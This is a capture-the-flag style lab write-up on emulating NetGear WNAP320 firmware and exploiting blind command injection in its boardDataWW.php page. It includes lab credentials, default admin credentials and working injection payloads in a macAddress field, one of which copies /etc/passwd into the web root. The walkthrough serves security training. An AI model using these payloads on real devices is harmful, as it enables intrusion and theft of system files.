> Intro To IOT PenTesting

export IP=10.10.148.167

**NOTE: SSH Credentials => iot:tryhackme123!**

We have been given a NetGear firmware. Let's unpack it. On unzippping `WNAP320 Firmware Version 2.0.3.zip` we have another tar file. And we ectract it too. There is a file `rootfs.sqash`. Running binwalk on that file we have a file system inside it. ANd accessing it's home directory we find a www directory. So there's a web application used.

And while examining all the php files we find a file `boardDataWW.php` which id vulnerable to blind command injection. The code has exec() command . Let's analyse rootfs.sqash using FAT (Firmware Analysis Tool). Lets copy rootfs.squash to the FAT folder. Change the pwner of file to root `chown root:root rootfs.squash`.

# Analysing

./fat.py rootfs.squash

```
[+] Firmware: rootfs.squashfs
[+] Extracting the firmware...
[+] Image ID: 1
[+] Identifying architecture...
[+] Architecture: mipseb
[+] Building QEMU disk image...
[+] Setting up the network connection, please standby...
[+] Network interfaces: [('brtrunk', '192.168.0.100')] => Take note of this IP
[+] All set! Press ENTER to run the firmware...
[+] When running, press Ctrl + A X to terminate qemu
[+] Command line: /home/iot/Desktop/firmware-analysis-toolkit/firmadyne/scratch/1/run.sh
```

Once emulation is done we have to port forward in our machine

`ssh -N iot@<IP> -L 8081:192.168.0.100:80`. Now accesing `http://localhost:8081` gives us NetGear login. Basic credentials are `admin:password`.

Accessing `http://localhost:8081/boardDataWW.php` then enter any MAC address and capture the request in Burp. Then send it to repeater. 

# POC

`macAddress=112233445566;+ping+-c+15+127.0.0.1+#&reginfo=0&writeData=Submit`

We have a 15 second delay for response proving us that we have blind command injection

`macAddress=112233445566;+cp+/etc/passwd+.+#&reginfo=0&writeData=Submit`

Now we have the password list.